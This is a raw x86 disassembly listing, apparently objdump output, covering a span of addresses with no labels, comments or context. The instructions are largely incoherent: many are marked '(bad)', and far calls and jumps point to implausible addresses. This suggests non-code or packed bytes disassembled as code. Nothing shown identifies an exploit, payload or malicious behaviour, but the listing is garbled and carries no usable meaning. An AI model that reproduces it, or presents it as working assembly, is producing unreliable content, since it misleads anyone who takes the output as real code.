  41782e:	mov    DWORD PTR [eax],0x40f44545
  417834:	xor    DWORD PTR [eax],eax
  417836:	test   DWORD PTR [ebx-0x34070b64],ecx
  41783c:	(bad)  
  41783d:	enter  0x4d45,0xbc
  417841:	mov    esi,DWORD PTR [eax]
  417843:	hlt    
  417844:	test   ebx,ecx
  417846:	pushf  
  417847:	enter  0x4df8,0x8b
  41784b:	mov    DWORD PTR [ebp-0x20],0x890208
  417852:	inc    ebp
  417853:	inc    ebp
  417854:	cld    
  417855:	xor    cl,BYTE PTR [ebx-0xb38b300]
  41785b:	or     BYTE PTR [ebx+0x0],dl
  41785e:	mov    ebx,0x8bd5500
  417863:	call   DWORD PTR [ecx-0x1]
  417866:	pop    es
  417867:	mov    ch,0x33
  417869:	dec    ebx
  41786b:	(bad)  
  41786c:	mov    eax,0x72009ca4
  417871:	push   DWORD PTR [edx]
  417873:	or     BYTE PTR [eax],al
  417875:	jmp    0xff89:0x75c84d03
  41787c:	dec    ebp
  41787d:	loopne 0x41784f
  41787f:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  417885:	add    BYTE PTR [ebx],dh
  417887:	mov    ecx,ebx
  417889:	hlt    
  41788a:	add    ecx,ebx
  41788c:	enter  0x899c,0x32
  417890:	dec    ebp
  417891:	add    ecx,eax
  417893:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  417899:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4178a0:	xor    ecx,ebx
  4178a2:	retf   
  4178a3:	enter  0x4d03,0xc8
  4178a7:	mov    DWORD PTR fs:[eax],ebx
  4178aa:	lea    eax,[eax]
  4178ac:	push   esp
  4178ad:	mov    edi,edi
  4178af:	fs (bad) 
  4178b1:	(bad)  
  4178b2:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4178b8:	push   0xffffffff
  4178ba:	and    bh,bh
  4178bc:	pop    ecx
  4178bd:	inc    eax
  4178be:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4178c4:	push   0xffffff8b
  4178c6:	pop    ecx
  4178c7:	cld    
  4178c8:	dec    ebp
  4178c9:	lea    ecx,[ecx+0x45ff08ff]
  4178cf:	mov    BYTE PTR [edx+0x1],cl
  4178d2:	add    BYTE PTR [eax],al
  4178d4:	mov    DWORD PTR [ebp+0x8],0x58008d
  4178db:	dec    DWORD PTR [ebp-0x77]
  4178de:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4178e5:	cld    
  4178e6:	dec    ebp
  4178e7:	jne    0x41791c
  4178e9:	lea    eax,[ebx]
  4178eb:	push   eax
  4178ec:	mov    edi,edi
  4178ee:	or     BYTE PTR [ecx+0x54a845],cl
  4178f4:	add    al,ch
  4178f6:	(bad)  
  4178f7:	sub    esp,ebp
  4178f9:	add    BYTE PTR [eax],al
  4178fb:	rol    BYTE PTR [eax],0x84
  4178fe:	inc    ebp
  4178ff:	add    dh,BYTE PTR [esi+0x0]
  417902:	add    BYTE PTR [ebp-0x73],al
  417905:	mov    ebp,DWORD PTR [esp+edx*4]
  417908:	inc    DWORD PTR [eax]
  41790a:	lea    ecx,[ebx-0x30074f4]
  417910:	call   0x428495
  417915:	add    BYTE PTR [ebp+0x0],cl
  417918:	jne    0x41795b
  41791a:	dec    DWORD PTR [ebx-0x76210314]
  417920:	dec    ebp
  417921:	add    DWORD PTR [ebp+0x0],esi
  417924:	(bad)  
  417925:	xchg   ebp,eax
  417926:	loopne 0x417927
  417928:	inc    eax
  417929:	inc    DWORD PTR [eax]
  41792b:	mov    ecx,DWORD PTR [ebp-0x4]
  41792e:	xor    edx,DWORD PTR [edx+0x7201b8]
  417934:	add    BYTE PTR [edx],dl
  417936:	enter  0x4d90,0x0
  41793a:	mov    eax,DWORD PTR [eax]
  41793c:	hlt    
  41793d:	add    al,0xa5
  41793f:	mov    al,0xff
  417941:	add    bh,bh
  417943:	add    BYTE PTR [ebx],dh
  417945:	inc    DWORD PTR [ebx]
  417947:	sbb    al,0x89
  417949:	jne    0x417923
  41794b:	mov    esp,DWORD PTR [ecx+0x4500fc]
  417951:	mov    eax,DWORD PTR [ebp-0xff0048]
  417957:	mov    DWORD PTR [eax-0x70],0xee58ed89
  41795e:	inc    DWORD PTR [ebp-0x75]
  417961:	fisttp QWORD PTR [eax+eiz*8]
  417964:	test   DWORD PTR [esi-0x1],esp
  417967:	inc    ebp
  417968:	(bad)  
  417969:	aas    
  41796a:	inc    ebp
  41796b:	(bad)  
  41796c:	lea    edi,[esp+eiz*2-0x1]
  417970:	inc    edi
  417972:	mov    DWORD PTR ds:0x8000c7a0,edi
  417978:	mov    ebp,esi
  41797a:	cld    
  41797b:	in     al,0x8d
  41797d:	inc    ebp
  41797e:	jmp    eax
  417980:	(bad)  
  417981:	fisttp WORD PTR [eax+0x8801c7]
  417987:	jecxz  0x4179ce
  417989:	out    dx,al
  41798a:	inc    DWORD PTR [ebp-0x4]
  41798d:	out    0x8d,eax
  41798f:	aas    
  417990:	inc    edi
  417992:	jmp    FWORD PTR [eax-0x78]
  417995:	inc    DWORD PTR [ecx]
  417997:	mov    DWORD PTR [eax],0xc7a83d
  41799d:	ins    BYTE PTR es:[edi],dx
  41799e:	test   edi,edi
  4179a0:	pandn  mm0,mm5
  4179a3:	aas    
  4179a4:	add    bh,al
  4179a6:	mov    esi,DWORD PTR [eax-0x4]
  4179a9:	inc    DWORD PTR [eax+0xdf01e0]
  4179af:	(bad)  
  4179b0:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4179b4:	mov    ebp,ebx
  4179b6:	xchg   esp,eax
  4179b7:	fild   DWORD PTR [eax]
  4179b9:	(bad)  
  4179ba:	mov    edi,DWORD PTR [eax+0x3]
  4179bd:	(bad)  
  4179be:	cmp    al,0xe7
  4179c0:	dec    ebp
  4179c1:	leave  
  4179c2:	mov    ebp,eax
  4179c4:	fsubr  DWORD PTR [ecx]
  4179c6:	add    BYTE PTR [eax],al
  4179c8:	lea    ecx,[ebx-0x7f0003b4]
  4179ce:	push   edx
  4179cf:	add    DWORD PTR [ebp+0x0],edx
  4179d2:	mov    esi,DWORD PTR [eax]
  4179d4:	mov    WORD PTR [ebx-0x7a750000],?
  4179da:	add    esi,DWORD PTR [ebp-0x78]
  4179dd:	mov    eax,DWORD PTR [eax]
  4179df:	cld    
  4179e0:	push   0x7d
  4179e2:	dec    DWORD PTR [ebx+0xd88c]
  4179e8:	push   edx
  4179e9:	mov    edx,DWORD PTR [ecx-0x4]
  4179ec:	call   DWORD PTR [eax+0x7d01fc]
  4179f2:	mov    ebx,edx
  4179f4:	cld    
  4179f5:	add    BYTE PTR [eax+0x560150],dl
  4179fb:	test   DWORD PTR [ebp+0x75],eax
  4179fe:	in     al,0x8b
  417a00:	in     al,dx
  417a01:	cld    
  417a02:	(bad)  
  417a03:	jge    0x417999
  417a05:	mov    esp,ebx
  417a07:	fsub   st,st(7)
  417a09:	add    bh,al
  417a0b:	mov    ebx,DWORD PTR [eax-0x7a6f8f04]
  417a11:	add    edi,edi
  417a13:	add    bh,bh
  417a15:	mov    eax,0x50d800ed
  417a1a:	inc    ebp
  417a1b:	push   esi
  417a1c:	fisttp WORD PTR [ebx+0x4dc7f43f]
  417a22:	test   BYTE PTR [ebx],dh
  417a24:	fadd   DWORD PTR ds:0x4572c2
  417a2a:	jmp    0x4179ed
  417a2c:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  417a33:	inc    esi
  417a34:	jo     0x417a36
  417a36:	test   edi,eax
  417a38:	jmp    esp
  417a3a:	inc    DWORD PTR [eax]
  417a3c:	in     eax,dx
  417a3d:	add    al,bl
  417a3f:	jne    0x4179c6
  417a41:	mov    edi,edi
  417a43:	cld    
  417a44:	inc    DWORD PTR [ebp-0x12]
  417a47:	mov    esp,esp
  417a49:	mov    ah,0x85
  417a4b:	add    bh,bh
  417a4d:	call   0x119a351
  417a52:	ret    0x858b
  417a55:	cld    
  417a56:	inc    DWORD PTR [eax+0xe301ff]
  417a5c:	out    dx,al
  417a5d:	xor    BYTE PTR [ebp-0xff00cf],al
  417a63:	mov    ebx,ebp
  417a65:	cld    
  417a66:	jo     0x4179f1
  417a68:	or     DWORD PTR [ecx],eax
  417a6a:	add    BYTE PTR [eax],al
  417a6c:	push   eax
  417a6d:	add    DWORD PTR [ebp+0x45],eax
  417a70:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  417a76:	dec    DWORD PTR [ebx-0x3fda0318]
  417a7c:	add    BYTE PTR [ebp-0xbf0040],dl
  417a82:	inc    ebp
  417a83:	or     BYTE PTR [ebx-0x4faf0400],0x45
  417a8a:	add    DWORD PTR [ebx+0x459c00],ecx
  417a90:	mov    edi,edi
  417a92:	mov    eax,0xe80800ff
  417a97:	inc    ebp
  417a98:	sub    BYTE PTR [ebx-0x47000400],cl
  417a9e:	add    al,0x1
  417aa0:	rol    BYTE PTR [eax],0x1e
  417aa3:	jne    0x417aea
  417aa5:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  417aab:	inc    DWORD PTR [ecx]
  417aad:	call   0x86a2b2
  417ab2:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  417ab8:	call   0x41a2be
  417abd:	xor    bh,bh
  417abf:	push   edi
  417ac0:	adc    BYTE PTR [ebx-0x747423bb],al
  417ac6:	loopne 0x417aa4
  417ac8:	ret    
  417ac9:	loopne 0x417a67
  417acb:	xor    DWORD PTR [edx],0x31
  417ace:	cmp    edi,edi
  417ad0:	bswap  esp
  417ad2:	rol    BYTE PTR gs:[eax],0x5
  417ad6:	jmp    0x12c7c20
  417adb:	mov    eax,DWORD PTR [ebp-0x4]
  417ade:	add    BYTE PTR [eax+0xff0100],bh
  417ae4:	cld    
  417ae5:	jne    0x417b64
  417ae7:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  417aed:	push   ss
  417aee:	add    DWORD PTR [eax],eax
  417af0:	add    BYTE PTR [eax+0x7f],dl
  417af3:	inc    ebp
  417af4:	add    BYTE PTR [ebx+0x459850],cl
  417afa:	mov    edi,edi
  417afc:	test   al,0xff
  417afe:	add    BYTE PTR [eax],cl
  417b00:	inc    DWORD PTR [ebp-0x18]
  417b03:	jmp    DWORD PTR ds:0x4d7d00dc
  417b09:	adc    BYTE PTR [ebx+0x459cb9],cl
  417b0f:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  417b15:	pushf  
  417b16:	mov    eax,0x30132
  417b1b:	lea    esi,[ebp+0x2c]
  417b1e:	xor    edi,edi
  417b20:	(bad)  
  417b21:	call   0x140a28e
  417b26:	call   0x135a3b6
  417b2b:	jne    0x417ab8
  417b2d:	xor    edi,esp
  417b2f:	add    eax,DWORD PTR [eax+0xc018d]
  417b35:	push   DWORD PTR [eax]
  417b37:	call   0xcaa293
  417b3c:	int3   
  417b3d:	inc    DWORD PTR [ebp-0x14]
  417b40:	mov    ecx,DWORD PTR [ebp-0x28]
  417b43:	xor    eax,DWORD PTR [eax]
  417b45:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  417b4b:	(bad)  
  417b4c:	xchg   ebp,eax
  417b4d:	in     al,0xff
  417b4f:	add    bh,bh
  417b51:	add    BYTE PTR [ebp+0x45],dl
  417b54:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  417b5a:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff64]
  417b61:	mov    edi,edi
  417b63:	or     BYTE PTR [eax],cl
  417b65:	inc    ebp
  417b66:	test   DWORD PTR gs:[eax],eax
  417b69:	je     0x417bb0
  417b6b:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  417b71:	xor    edx,DWORD PTR [eax-0x73]
  417b74:	push   ebp
  417b75:	or     BYTE PTR [ebp+0x21007572],al
  417b7b:	inc    ebp
  417b7c:	in     al,dx
  417b7d:	mov    ebp,DWORD PTR [eax]
  417b7f:	mov    esp,0x648bc345
  417b84:	fmul   st,st(5)
  417b86:	add    BYTE PTR [ebx],ch
  417b88:	mov    eax,DWORD PTR [ebx]
  417b8a:	cld    
  417b8b:	loopne 0x417b4d
  417b8d:	inc    ebp
  417b8e:	push   ebp
  417b8f:	cmp    ebp,eax
  417b91:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  417b98:	cld    
  417b99:	fadd   DWORD PTR [eax+0x3b014d]
  417b9f:	jne    0x417bd1
  417ba1:	push   0xf8898557
  417ba6:	in     al,dx
  417ba7:	jne    0x417bee
  417ba9:	lea    eax,[ebx+0x72e8dcc8]
  417baf:	das    
  417bb0:	mov    eax,DWORD PTR [eax]
  417bb2:	mov    esp,0x33eb7545
  417bb7:	mov    edi,DWORD PTR [edi+0x4572bc]
  417bbd:	xor    eax,edi
  417bbf:	adc    DWORD PTR [ebp-0xcd0064],0x8be131
  417bc9:	rcl    BYTE PTR [eax-0x40],1
  417bcc:	inc    ebp
  417bcd:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  417bd5:	inc    ebp
  417bd6:	xchg   ebp,eax
  417bd7:	ud0    ebp,DWORD PTR [ebx]
  417bda:	inc    DWORD PTR [eax]
  417bdc:	retf   
  417bdd:	jbe    0x417bdf
  417bdf:	mov    dl,BYTE PTR [eax-0x80]
  417be2:	push   ebp
  417be3:	pop    ds
  417be4:	mov    ecx,DWORD PTR [esp+esi*8]
  417be7:	inc    eax
  417be8:	retf   
  417be9:	inc    ebp
  417bea:	iret   
  417beb:	jb     0x417bb5
  417bed:	mov    eax,DWORD PTR [edi]
  417bef:	enter  0x4545,0x1
  417bf3:	xor    DWORD PTR [eax],eax
  417bf5:	pushf  
  417bf6:	mov    ecx,DWORD PTR [ecx+0x304df0bc]
  417bfc:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  417c03:	dec    ebp
  417c04:	add    BYTE PTR [ebx],dh
  417c06:	inc    ebp
  417c07:	mov    DWORD PTR [ebx-0x3f631b4c],ecx
  417c0d:	xor    dl,BYTE PTR [edx]
  417c0f:	add    eax,DWORD PTR [ebp-0x77]
  417c12:	mov    eax,esp
  417c14:	fmul   DWORD PTR [ebp-0x3d]
  417c17:	xor    eax,DWORD PTR [ebx+eax*1+0x832899c]
  417c1e:	mov    DWORD PTR [ebp-0x28],eax
  417c21:	rol    DWORD PTR [ebp-0x64],1
  417c24:	xor    eax,edi
  417c26:	mov    ecx,0xff858db0
  417c2b:	clc    
  417c2c:	enter  0x4d45,0x32
  417c30:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  417c37:	test   esi,edi
  417c39:	clc    
  417c3a:	inc    DWORD PTR [ebp+0x45]
  417c3d:	cmp    al,0x8b
  417c3f:	pushf  
  417c40:	or     bh,al
  417c42:	enter  0x16a8,0x85
  417c46:	xor    eax,edi
  417c48:	pushf  
  417c49:	inc    ebp
  417c4a:	(bad)  
  417c4b:	ds cld 
  417c4d:	pushf  
  417c4e:	inc    ebp
  417c4f:	mov    edx,DWORD PTR [eax-0x28]
  417c52:	lock push ebp
  417c54:	add    BYTE PTR [ebx],dh
  417c56:	mov    DWORD PTR [ebx],eax
  417c58:	sar    BYTE PTR [ebx],1
  417c5a:	adc    BYTE PTR [edi],cl
  417c5c:	dec    ebp
  417c5d:	adc    al,0x8b
  417c5f:	add    al,dl
  417c61:	jmp    0x1027e31
  417c66:	jb     0x417cb5
  417c68:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  417c6e:	xor    ecx,DWORD PTR [ebp+0x3b]
  417c71:	xor    ecx,DWORD PTR [edi]
  417c73:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  417c77:	(bad)  
  417c79:	clc    
  417c7a:	enter  0x8400,0x8b
  417c7e:	pop    es
  417c7f:	mov    al,0x0
  417c81:	push   ebp
  417c82:	push   cs
  417c83:	xor    ecx,eax
  417c85:	xor    esp,ecx
  417c87:	add    ebp,DWORD PTR [eax]
  417c89:	add    esi,DWORD PTR [eax]
  417c8b:	(bad)  
  417c8d:	retf   0x55c8
  417c90:	repnz mov eax,DWORD PTR [ebp-0x10]
  417c94:	(bad)  
  417c95:	cli    
  417c96:	fdivr  st,st(1)
  417c98:	test   DWORD PTR [eax+edi*8],ecx
  417c9b:	dec    ebp
  417c9c:	inc    ebp
  417c9d:	xor    edi,DWORD PTR [eax-0x7167afd]
  417ca3:	add    BYTE PTR [ebp+0x0],al
  417ca6:	mov    ecx,DWORD PTR [ebp-0x28]
  417ca9:	mov    ecx,ebx
  417cab:	clc    
  417cac:	jne    0x417c79
  417cae:	mov    esi,0xd672d3
  417cb3:	into   
  417cb4:	into   
  417cb5:	scas   eax,DWORD PTR es:[edi]
  417cb6:	dec    ebp
  417cb7:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  417cbd:	sub    ecx,esi
  417cbf:	cmp    ecx,DWORD PTR [ebp+0x77]
  417cc2:	(bad)  
  417cc3:	mov    edi,eax
  417cc5:	mov    al,0x85
  417cc7:	mov    eax,edi
  417cc9:	add    BYTE PTR [ebp-0x75],al
  417ccc:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  417cd3:	xor    eax,DWORD PTR [ebp+0x4503f803]
  417cd9:	(bad)  
  417cdb:	retf   0x559c
  417cde:	(bad)  
  417cdf:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  417ce6:	inc    ebp
  417ce7:	add    eax,0xeb9c4d3f
  417cec:	(bad)  
  417ced:	mov    ecx,esp
  417cef:	lods   al,BYTE PTR ds:[esi]
  417cf0:	test   DWORD PTR [ebp-0x8],edx
  417cf3:	xor    ecx,DWORD PTR [ebp+0x33]
  417cf6:	mov    eax,DWORD PTR [ebx]
  417cf8:	lock add ecx,ebx
  417cfb:	bswap  esi
  417cfd:	retf   0x55d1
  417d00:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  417d06:	jmp    0x417d01
  417d08:	add    BYTE PTR ds:0xebc44d8b,al
  417d0e:	push   ebp
  417d0f:	mov    ebp,DWORD PTR [ebx]
  417d11:	test   al,0x8b
  417d13:	push   ebp
  417d14:	clc    
  417d15:	xor    ecx,ebx
  417d17:	xor    ecx,esi
  417d19:	add    edx,ecx
  417d1b:	add    eax,DWORD PTR [edx+0xca010f]
  417d21:	push   ebp
  417d22:	dec    ebp
  417d23:	mov    ecx,DWORD PTR [ebx-0x34050710]
  417d29:	stc    
  417d2a:	rol    DWORD PTR ds:0xebce4dd6,cl
  417d30:	scas   eax,DWORD PTR es:[edi]
  417d31:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  417d37:	xor    ebp,DWORD PTR [ebx]
  417d39:	xor    edi,DWORD PTR [ebx]
  417d3b:	add    esi,DWORD PTR [edi+0x3]
  417d3e:	mov    ecx,DWORD PTR [edi]
  417d40:	clc    
  417d41:	retf   0x55cb
  417d44:	into   
  417d45:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  417d4c:	mov    eax,0x3376554d
  417d51:	mov    esi,DWORD PTR [ebx]
  417d53:	int3   
  417d54:	add    edx,DWORD PTR [ebp+0x3]
  417d57:	xor    ecx,DWORD PTR [edi]
  417d59:	xor    ecx,edx
  417d5b:	add    edx,DWORD PTR [ebp+0x3]
  417d5e:	mov    ecx,DWORD PTR [edi]
  417d60:	lock retf 0x4dfa
  417d64:	stc    
  417d65:	mov    ecx,DWORD PTR [eax]
  417d67:	or     BYTE PTR [ebp+0x4d],cl
  417d6a:	jmp    0x1057dfa
  417d6f:	dec    ebp
  417d70:	dec    ebp
  417d71:	(bad)  
  417d72:	mov    ebx,esp
  417d74:	clc    
  417d75:	test   ebx,ecx
  417d77:	clc    
  417d78:	ror    DWORD PTR [ebp-0x2a],cl
  417d7b:	mov    esi,ecx
  417d7d:	call   0x33ccc331
  417d82:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  417d89:	retf   
  417d8a:	ja     0x417d5a
  417d8c:	mov    ebp,DWORD PTR [eax-0x48]
  417d8f:	dec    ebp
  417d90:	xor    ecx,DWORD PTR [di+0x3]
  417d94:	mov    esp,esp
  417d96:	clc    
  417d97:	push   ebp
  417d98:	retf   
  417d99:	mov    dl,bl
  417d9b:	adc    esi,edx
  417d9d:	jb     0x417d6d
  417d9f:	add    BYTE PTR [edi-0x3b7474b3],ch
  417da5:	call   0x4d6d4927
  417daa:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  417db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417db1:	pushf  
  417db2:	inc    ebp
  417db3:	xor    cl,BYTE PTR [ebp-0x78]
  417db6:	mov    edx,edi
  417db8:	clc    
  417db9:	dec    ebp
  417dba:	retf   
  417dbb:	mov    edx,ebx
  417dbd:	call   0x56105198
  417dc2:	scas   eax,DWORD PTR es:[edi]
  417dc3:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  417dc9:	pushf  
  417dca:	sub    esi,DWORD PTR [edx]
  417dcc:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  417dd2:	lods   al,BYTE PTR ds:[esi]
  417dd3:	xor    esp,DWORD PTR [ebx]
  417dd5:	add    ecx,DWORD PTR [ebp-0x1c]
  417dd8:	mov    edi,DWORD PTR [ebp-0x8]
  417ddb:	mov    bl,cl
  417ddd:	cmp    dl,bl
  417ddf:	jb     0x417daf
  417de1:	add    dh,dl
  417de3:	dec    ebp
  417de4:	scas   eax,DWORD PTR es:[edi]
  417de5:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  417deb:	shr    DWORD PTR [ebx],cl
  417ded:	into   
  417dee:	cmp    edx,esi
  417df0:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  417df6:	dec    ebp
  417df7:	dec    ebp
  417df8:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  417dfe:	retf   
  417dff:	xor    edx,esi
  417e01:	add    ecx,esi
  417e03:	imul   ecx,edx
  417e06:	mov    DWORD PTR [ebp+0x8],edx
  417e09:	xor    ecx,DWORD PTR [ebp+0x2b]
  417e0c:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  417e12:	add    esi,DWORD PTR [ebx]
  417e14:	mov    ah,0x3
  417e16:	inc    ebp
  417e17:	rdtsc  
  417e19:	xlat   BYTE PTR ds:[ebx]
  417e1a:	pushf  
  417e1b:	jge    0x417da6
  417e1d:	xor    ebx,eax
  417e1f:	sub    eax,DWORD PTR [ebp-0x73]
  417e22:	(bad)  
  417e23:	cmp    al,al
  417e25:	jb     0x417dac
  417e27:	add    al,bh
  417e29:	ror    DWORD PTR [ebp-0x7a],1
  417e2c:	xor    edi,edi
  417e2e:	add    edi,edi
  417e30:	jmp    0x417e7f
  417e32:	mov    ecx,DWORD PTR [ebx-0x34341324]
  417e38:	dec    ebp
  417e39:	into   
  417e3a:	mov    ebp,DWORD PTR [edi-0x23737428]
  417e40:	pushf  
  417e41:	shl    DWORD PTR [edx],cl
  417e43:	retf   0x5588
  417e46:	or     ecx,DWORD PTR [ebp+0x7233114d]
  417e4c:	add    eax,DWORD PTR [eax]
  417e4e:	in     al,0x4d
  417e50:	push   ebp
  417e51:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  417e57:	fs add ch,cl
  417e5a:	dec    ebp
  417e5b:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  417e61:	dec    ebp
  417e62:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  417e68:	jge    0x417e38
  417e6a:	mov    BYTE PTR [edi+0xf723b3a],ch
  417e70:	add    cl,dh
  417e72:	dec    ebp
  417e73:	dec    DWORD PTR [ebx-0x2c032375]
  417e79:	adc    BYTE PTR [ebp+0x1],0x8b
  417e7d:	add    al,bl
  417e7f:	jge    0x417e0d
  417e81:	push   0xffffff9c
  417e83:	push   0x8b3032
  417e88:	shl    BYTE PTR [ebp+0x55],0x6a
  417e8c:	xor    edi,edi
  417e8e:	xor    edx,DWORD PTR [ebx+eax*1]
  417e91:	inc    ebp
  417e92:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  417e98:	dec    ebp
  417e99:	or     BYTE PTR [ecx+0x4dc8e483],cl
  417e9f:	jbe    0x417e2c
  417ea1:	mov    ebp,esp
  417ea3:	ror    bl,1
  417ea5:	enter  0x14ce,0xaf
  417ea9:	dec    DWORD PTR [ebx-0x2cef17f8]
  417eaf:	push   ebp
  417eb0:	retf   0x5540
  417eb3:	push   ebp
  417eb4:	mov    esi,DWORD PTR [edx-0x1c]
  417eb7:	mov    edx,ebx
  417eb9:	cld    
  417eba:	(bad)  
  417ebb:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  417ec2:	sti    
  417ec3:	add    dh,cl
  417ec5:	push   0xffffff94
  417ec7:	call   FWORD PTR [eax+edx*8-0x74c4afce]
  417ece:	bswap  esp
  417ed0:	pop    esi
  417ed1:	inc    ebp
  417ed2:	dec    DWORD PTR [ecx+0x45e8c88b]
  417ed8:	push   ebp
  417ed9:	xor    esi,DWORD PTR [ebx]
  417edb:	mov    DWORD PTR [ebx],0xcac00f9c
  417ee1:	aas    
  417ee2:	push   ebp
  417ee3:	inc    ebp
  417ee4:	xor    ecx,eax
  417ee6:	add    ecx,eax
  417ee8:	mov    eax,DWORD PTR [ebx]
  417eea:	(bad)  
  417eeb:	jmp    0x417e79
  417eed:	mov    bl,BYTE PTR [ebp+eax*1-0x2f7674ce]
  417ef4:	les    edi,FWORD PTR [esi-0xeccefb3]
  417efa:	mov    edx,0xff378d80
  417eff:	mov    dh,0xd1
  417f01:	cmp    edx,DWORD PTR [ebp+0xf]
  417f04:	mov    eax,DWORD PTR [edx-0x20]
  417f07:	add    BYTE PTR [ebp-0x75],bh
  417f0a:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  417f11:	pushf  
  417f12:	retf   0x8632
  417f15:	cmp    ebp,0x8
  417f18:	call   ebx
  417f1a:	inc    ebp
  417f1b:	inc    ebp
  417f1c:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  417f22:	mov    esi,DWORD PTR [ecx]
  417f24:	enter  0x49c,0xc7
  417f28:	add    al,al
  417f2a:	add    bl,al
  417f2c:	(bad)  
  417f2d:	clc    
  417f2e:	enter  0x45,0x31
  417f32:	push   eax
  417f33:	pushf  
  417f34:	mov    edi,eax
  417f36:	int3   
  417f37:	or     al,al
  417f39:	test   DWORD PTR [edi],edi
  417f3b:	clc    
  417f3c:	gs inc ebp
  417f3e:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  417f44:	push   ss
  417f45:	xor    ecx,DWORD PTR [ebp+0x3]
  417f48:	sub    edx,DWORD PTR [ecx-0x76]
  417f4b:	dec    ebp
  417f4c:	add    DWORD PTR [ebx+0x88d845],ecx
  417f52:	mov    esi,DWORD PTR [ebx]
  417f54:	or     BYTE PTR [ebx],al
  417f56:	cmp    edx,DWORD PTR [ecx-0x38]
  417f59:	dec    ebp
  417f5a:	out    dx,eax
  417f5b:	xor    eax,DWORD PTR [ebp+0x3]
  417f5e:	mov    edx,DWORD PTR [ecx-0x28]
  417f61:	dec    ebp
  417f62:	add    BYTE PTR [ebx],dh
  417f64:	push   0x518003
  417f69:	push   eax
  417f6a:	add    BYTE PTR [ebx-0x300748b],cl
  417f70:	sbb    BYTE PTR [ebp+0x45],cl
  417f73:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  417f79:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  417f7f:	dec    ebp
  417f80:	inc    ebp
  417f81:	xor    ecx,eax
  417f83:	add    ecx,eax
  417f85:	push   ecx
  417f86:	(bad)  
  417f87:	dec    ebp
  417f88:	mov    al,ds:0xc5e03dff
  417f8d:	retf   
  417f8e:	(bad)  
  417f8f:	into   
  417f90:	sub    bh,bh
  417f92:	dec    esp
  417f93:	adc    al,0x9c
  417f95:	inc    ebp
  417f96:	push   ebp
  417f97:	test   DWORD PTR [edi],ecx
  417f99:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab8ff80]
  417fa0:	jmp    0xc9ba8eb4
  417fa5:	add    cl,dl
  417fa7:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  417fb1:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  417fb7:	rol    BYTE PTR [eax],0x55
  417fba:	clc    
  417fbb:	fs jb  0x417fc5
  417fbe:	mov    eax,DWORD PTR [ebp-0x30]
  417fc1:	xor    al,0x40
  417fc3:	sub    al,0xc7
  417fc5:	mov    ah,ch
  417fc7:	add    DWORD PTR [ebp+0x4534f845],eax
  417fcd:	sub    al,0x86
  417fcf:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  417fd6:	mov    ch,0xff
  417fd8:	clc    
  417fd9:	add    DWORD PTR [ebp+0x60],0x3d
  417fdd:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  417fe4:	inc    ebp
  417fe5:	dec    DWORD PTR [ebx-0x341ff701]
  417feb:	test   esi,ecx
  417fed:	dec    DWORD PTR [ebx-0x7f8a3301]
  417ff3:	push   eax
  417ff4:	add    DWORD PTR [ebp+0x0],eax
  417ff7:	dec    ebx
  417ff9:	or     al,0xce
  417ffb:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  418002:	into   
  418003:	add    BYTE PTR [ebx-0x34ff1400],cl
  418009:	mov    esi,ecx
  41800b:	sar    bh,0x45
  41800e:	adc    al,0x8b
  418010:	clc    
  418011:	fadd   DWORD PTR [ebp+0x0]
  418014:	mov    ebp,DWORD PTR [edx+0x8]
  418017:	push   edi
  418018:	adc    BYTE PTR [eax+0x1],0x83
  41801c:	add    al,al
  41801e:	retf   
  41801f:	mov    ecx,esi
  418021:	cld    
  418022:	mov    eax,DWORD PTR [eax+0xcb01cc]
  418028:	into   
  418029:	add    BYTE PTR [ebx+0x756aec00],cl
  41802f:	jne    0x418064
  418031:	inc    DWORD PTR [ebx]
